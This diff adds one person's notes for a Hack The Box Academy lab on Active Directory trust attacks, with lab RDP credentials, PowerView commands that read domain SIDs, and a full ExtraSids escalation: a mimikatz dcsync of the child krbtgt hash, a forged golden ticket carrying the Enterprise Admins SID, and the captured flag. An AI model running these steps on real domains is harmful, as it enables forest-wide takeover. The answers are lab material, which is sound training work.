@@ -240,19 +240,28 @@ Cached Tickets: (1)
 	Kdc Called: 
 
 
-CHALLENGE : RDP to with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!"
+CHALLENGE : RDP to 10.129.180.47 (ACADEMY-EA-DC02) with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!"
 
 
 Question 1 -  What is the SID of the child domain?
-
-
+1) xfreerdp /v:10.129.180.47 /u:htb-student /p:HTB_@cademy_stdnt_admin! /drive:shared,/home/htb-ac-1235531/Desktop
+2) powershell as admin
+3) Cd c:\Tools
+4) Import-Module .\PowerView.ps1
+5) Get-DomainSID 
+6) output: S-1-5-21-2806153819-209893948-922872689
 
 
 Question 2 - What is the SID of the Enterprise Admins group in the root domain?
-
+1) steps as above 
+2) Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+3) Output:  S-1-5-21-3842939050-3880317879-2865463114-519
 
 
 Question 3 - Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.
-
+1) gathering the info from first two questions, then go into mimiaktz 
+2) mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt -> get krbtgt of child domain = 9d765b482771505cbe97411065964d5f 
+3) kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+4) type \\academy-ea-dc01.inlanefreight.local\c\ExtraSids\flag.txt - f@ll1ng_l1k3_d0m1no3$ 
 
 
